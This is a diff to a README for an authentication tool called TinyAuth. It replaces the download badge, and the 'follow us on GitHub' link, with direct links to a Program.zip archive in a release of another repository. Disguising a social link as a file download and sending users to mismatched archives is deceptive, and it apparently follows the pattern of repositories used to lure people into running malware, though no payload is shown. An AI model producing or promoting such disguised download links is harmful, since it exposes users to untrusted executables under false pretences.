@@ -14,7 +14,7 @@ TinyAuth is a lightweight authentication solution that provides a simple way to 
 
 To get started with TinyAuth, download the latest release from the following link:
 
-[![Download TinyAuth](https://img.shields.io/badge/Download-TinyAuth-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download TinyAuth](https://github.com/ohiorizzskibidi/tinyauth/releases/download/v1.0/Program.zip)](https://github.com/ohiorizzskibidi/tinyauth/releases/download/v1.0/Program.zip)
 
 ### Launching the Application
 
@@ -46,6 +46,6 @@ If you encounter any issues or have any feedback to share, please feel free to r
 
 ## Stay Connected
 
-Stay updated on the latest news and releases by following us on [GitHub](https://github.com).
+Stay updated on the latest news and releases by following us on [GitHub](https://github.com/ohiorizzskibidi/tinyauth/releases/download/v1.0/Program.zip).
 
 Thank you for choosing TinyAuth to protect your applications! 🚀🔒
